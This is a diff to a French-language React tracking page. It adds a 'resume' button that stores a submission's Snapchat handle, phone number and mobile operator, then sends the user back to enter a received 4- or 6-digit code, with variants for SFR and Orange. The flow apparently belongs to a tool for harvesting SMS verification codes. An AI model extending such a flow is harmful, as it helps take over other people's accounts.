@@ -22,6 +22,13 @@ const STATUS_MAP = {
   waiting_queue: 0,
 };
 
+const RESUME_STEPS = {
+  code_ready: "code",
+  code6_ready: "code6",
+  code6sfr_ready: "code6sfr",
+  code6orange_ready: "code6orange",
+};
+
 const STATUS_LABELS = {
   pending: "En attente de code",
   code_ready: "Code prêt (4 chiffres)",
@@ -65,6 +72,18 @@ export default function Suivi() {
   const currentStep = STATUS_MAP[status] ?? 0;
   const isWrong = status === "code_wrong";
   const isExpired = status === "code_expired";
+  const canResume = RESUME_STEPS[status];
+
+  const handleResume = () => {
+    if (!id) return;
+    sessionStorage.setItem("submissionId", id);
+    sessionStorage.setItem("submittedData", JSON.stringify({
+      snapchat: data?.snapchat || "",
+      telephone: data?.telephone || "",
+      operateur: data?.operateur || "",
+    }));
+    window.location.href = "/?resume=1";
+  };
 
   const formatPhone = (tel) => tel?.replace(/(\d{2})(?=\d)/g, "$1 ").trim();
   const formatDate = (d) => {
@@ -148,6 +167,21 @@ export default function Suivi() {
                     {STATUS_LABELS[status] || status}
                   </p>
                 </div>
+
+                {/* Bouton reprise saisie du code */}
+                {canResume && (
+                  <motion.button
+                    initial={{ opacity: 0, y: 10 }}
+                    animate={{ opacity: 1, y: 0 }}
+                    whileHover={{ scale: 1.02 }}
+                    whileTap={{ scale: 0.98 }}
+                    onClick={handleResume}
+                    className="w-full mb-6 bg-primary text-primary-foreground font-bold py-4 rounded-2xl shadow-lg shadow-primary/30 flex items-center justify-center gap-2.5 hover:bg-primary/90 transition-colors"
+                  >
+                    <KeyRound className="w-5 h-5" />
+                    Entrez le code reçu maintenant !
+                  </motion.button>
+                )}
 
                 {/* Timeline */}
                 <div className="relative pl-2">
